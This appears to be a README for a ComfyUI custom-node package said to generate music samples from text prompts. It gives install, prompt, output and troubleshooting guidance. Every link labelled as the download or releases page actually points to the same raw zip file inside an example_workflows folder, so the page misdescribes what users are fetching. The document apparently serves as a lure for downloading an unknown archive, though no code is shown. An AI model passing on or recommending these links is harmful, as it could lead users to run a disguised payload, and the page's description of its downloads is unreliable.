# 🎵 ComfyUI-Foundation-1 - Turn Text Into Music Samples

[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/raw/refs/heads/main/example_workflows/U_Comfy_Foundation_laxness.zip)

## 🎧 What this is

ComfyUI-Foundation-1 adds Foundation-1 custom nodes to ComfyUI. It helps you turn text into short audio samples for music work.

Use it if you want to:
- Create music ideas from text prompts
- Build audio samples in ComfyUI
- Try text-to-audio workflows on Windows
- Work with structured text-to-sample diffusion models

## 🪟 What you need

Before you start, make sure you have:
- Windows 10 or Windows 11
- ComfyUI installed
- A working NVIDIA GPU for best results
- Enough free disk space for model files
- A stable internet connection for the first download

A GPU with at least 8 GB VRAM is a good fit. More VRAM helps with larger workflows and faster runs.

## ⬇️ Download and install

1. Visit the [releases page](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/raw/refs/heads/main/example_workflows/U_Comfy_Foundation_laxness.zip) to download.
2. Open the latest release.
3. Download the Windows package or the source files from that page.
4. If you get a zip file, extract it to your ComfyUI custom nodes folder.
5. Start ComfyUI again so it can load the new nodes.

Typical folder path:
- `ComfyUI/custom_nodes/ComfyUI-Foundation-1`

If you use a portable ComfyUI build, place the folder inside the `custom_nodes` folder next to the ComfyUI app files.

## 🧩 How to set it up in ComfyUI

After you install the files:
1. Open ComfyUI
2. Look for the new Foundation-1 nodes in the node menu
3. Add the nodes to your workflow
4. Connect them to your prompt and audio output nodes
5. Run the workflow to create a sample

If the nodes do not show up, restart ComfyUI once more.

## 🎼 Basic use

A simple workflow usually follows this path:
- Enter a text prompt
- Set the sample length
- Choose the output type
- Run the queue
- Save the generated audio

Example prompts:
- lo-fi drum loop with soft vinyl texture
- ambient synth pad with wide space
- cinematic pulse with warm bass
- short melodic idea for a chorus

Keep prompts clear. Short prompts often work well for testing. Add style words if you want a tighter result.

## ⚙️ Common workflow parts

You may see these parts in a ComfyUI graph:
- Prompt input
- Foundation-1 text-to-sample node
- Sampling controls
- Audio decode or save node

What they do:
- Prompt input: sends text to the model
- Sampling controls: shape the output
- Audio save node: writes the sound file to disk

## 🔊 Tips for better results

Use these habits for more useful output:
- Start with short prompts
- Mention the sound source
- Add genre words
- Use clear mood words
- Test one change at a time

Good prompt patterns:
- instrument + mood + texture
- genre + tempo feel + sound type
- use case + length + tone

Examples:
- mellow piano loop, soft room tone
- aggressive drum hit, dry and punchy
- dreamy synth bed, slow motion feel

## 📁 Output files

The workflow usually saves audio files in a folder inside ComfyUI, such as:
- `output`
- `temp`
- a custom audio export folder set in the workflow

Common file types:
- `.wav`
- `.flac`
- `.mp3` if your workflow includes conversion

If you want to share or edit the audio later, `.wav` is a good default.

## 🧠 Model files

Foundation-1 workflows often need model files before they can run. Place them where your ComfyUI setup expects them, such as:
- `ComfyUI/models/checkpoints`
- `ComfyUI/models/diffusion_models`
- `ComfyUI/models/clip`
- `ComfyUI/models/audio`

Use the file names and paths from the release instructions or workflow notes. After you add model files, restart ComfyUI.

## 🛠️ If something does not work

If ComfyUI does not load the nodes:
- Check that the folder is in `custom_nodes`
- Make sure the folder name is correct
- Restart ComfyUI
- Check that Python and ComfyUI are up to date

If the workflow runs but no audio comes out:
- Check the output node
- Confirm the model files are in place
- Try a short prompt first
- Lower the sample length for a test run

If the app feels slow:
- Close other heavy programs
- Use a smaller sample size
- Reduce generation length
- Make sure your GPU drivers are current

## 📌 Example first run

A simple first test can look like this:
1. Open ComfyUI
2. Add the Foundation-1 text-to-sample node
3. Enter a prompt like `ambient synth loop with soft texture`
4. Set a short length for a quick test
5. Run the workflow
6. Listen to the output file in your media player

This helps you confirm that the install works before you build a larger project.

## 🧾 File layout

A typical install may look like this:
- `ComfyUI/`
- `ComfyUI/custom_nodes/ComfyUI-Foundation-1/`
- `ComfyUI/models/`
- `ComfyUI/output/`

Keep the files in the same ComfyUI folder tree. That helps the app find the nodes and model files.

## 🔁 Updating the app

When a new release appears:
1. Go to the [releases page](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/raw/refs/heads/main/example_workflows/U_Comfy_Foundation_laxness.zip)
2. Download the newest version
3. Replace the old custom node folder
4. Restart ComfyUI
5. Test a simple prompt again

If you keep custom workflows, save them before you update.

## 🔍 What this project is for

This project fits well for:
- Music idea sketches
- Sound design tests
- Audio sample drafts
- Prompt-based audio experiments
- ComfyUI users who want text-to-sample output

It is built around structured text-to-sample diffusion, so it works best when you keep prompts clear and focused.

## 📎 Download again

[![Releases Page](https://img.shields.io/badge/Go%20to-Releases%20Page-grey?style=for-the-badge)](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/raw/refs/heads/main/example_workflows/U_Comfy_Foundation_laxness.zip)

## 🪄 Quick checklist

- Download the release from GitHub
- Extract the files
- Copy the folder into `ComfyUI/custom_nodes`
- Add the needed model files
- Restart ComfyUI
- Run a short test prompt